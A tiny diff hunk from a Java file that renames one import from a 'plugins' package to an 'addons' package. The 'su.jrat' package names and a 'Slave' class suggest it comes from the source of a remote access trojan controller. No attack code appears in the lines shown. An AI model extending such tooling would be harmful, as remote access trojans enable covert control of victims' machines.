@@ -4,7 +4,7 @@ import java.util.HashMap;
 import java.util.Set;
 
 import su.jrat.client.Slave;
-import su.jrat.client.plugins.PluginEventHandler;
+import su.jrat.client.addons.PluginEventHandler;
 import su.jrat.common.PacketRange;
 
 
